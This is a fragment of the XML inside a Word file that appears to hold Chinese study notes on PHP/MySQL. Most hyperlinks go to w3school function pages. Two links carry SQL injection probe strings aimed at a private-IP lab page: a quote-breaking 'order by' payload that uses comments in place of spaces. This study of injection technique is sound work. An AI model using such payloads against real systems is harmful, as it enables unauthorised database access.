    <w:unhideWhenUsed/>
    <w:rsid w:val="00465180"/>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ab">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="a"/>
    <w:link w:val="Char1"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008E15BD"/>
    <w:rPr>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Char1">
    <w:name w:val="批注框文本 Char"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="ab"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="008E15BD"/>
    <w:rPr>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="3">
    <w:name w:val="笔记3级标"/>
    <w:basedOn w:val="10"/>
    <w:next w:val="my"/>
    <w:link w:val="3Char1"/>
    <w:qFormat/>
    <w:rsid w:val="00CA0CA4"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="46"/>
      </w:numPr>
      <w:spacing w:before="40" w:after="40" w:line="240" w:lineRule="auto"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="0"/>
      <w:bCs/>
      <w:sz w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="3Char1">
    <w:name w:val="笔记3级标 Char"/>
    <w:basedOn w:val="3Char"/>
    <w:link w:val="3"/>
    <w:rsid w:val="00CA0CA4"/>
    <w:rPr>
      <w:b w:val="0"/>
      <w:bCs/>
      <w:kern w:val="44"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="44"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="my">
    <w:name w:val="my正文"/>
    <w:basedOn w:val="a"/>
    <w:qFormat/>
    <w:rsid w:val="00812AAA"/>
    <w:pPr>
      <w:ind w:firstLineChars="200" w:firstLine="200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1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w3school.com.cn/php/func_mysql_data_seek.asp" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_fetch_assoc.asp" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_field_seek.asp" TargetMode="External"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_num_rows.asp" TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_fetch_object.asp" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_info.asp" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_query.asp" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_thread_id.asp" TargetMode="External"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.png"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject1.bin"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://172.24.178.143/sqli/example2.php?name=root'/**/order/**/by/**/1" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_connect.asp" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_fetch_array.asp" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_field_name.asp" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_get_server_info.asp" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_num_fields.asp" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_stat.asp" TargetMode="External"/><Relationship Id="rId59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hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_error.asp" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_fetch_lengths.asp" TargetMode="External"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_free_result.asp" TargetMode="External"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_ping.asp" TargetMode="External"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image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w3school.com.cn/php/func_mysql_close.asp" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_field_len.asp" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_get_proto_info.asp" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_list_processes.asp" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_pconnect.asp" TargetMode="External"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_select_db.asp" TargetMode="External"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.emf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w3school.com.cn/php/func_mysql_errno.asp" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_field_flags.asp" TargetMode="External"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_field_type.asp" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_list_dbs.asp" TargetMode="External"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.xx.com/news/1/23/index.html" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_client_encoding.asp" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_fetch_field.asp" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_get_host_info.asp" TargetMode="External"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_result.asp" TargetMode="External"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://xx.aspx?id=1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w3school.com.cn/php/func_mysql_affected_rows.asp" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_db_name.asp" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_fetch_row.asp" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_field_table.asp" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_get_client_info.asp" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_insert_id.asp" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" TargetMode="External"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3school.com.cn/php/func_mysql_unbuffered_query.asp" TargetMode="External"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image5.png"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://172.24.178.143/sqli/example2.php?name=root%27%2f%2a%2a%2forder%25" TargetMode="External"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://xxx.asp?id=1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3770</TotalTime>
  <Pages>22</Pages>
  <Words>3858</Words>
  <Characters>21992</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>183</Lines>
  <Paragraphs>51</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>25799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szgd</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>rj f</cp:lastModifiedBy>
  <cp:revision>713</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-08-15T08:09:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2017-09-01T02:59:00Z</dcterms:modified>
</cp:coreProperties>
</file>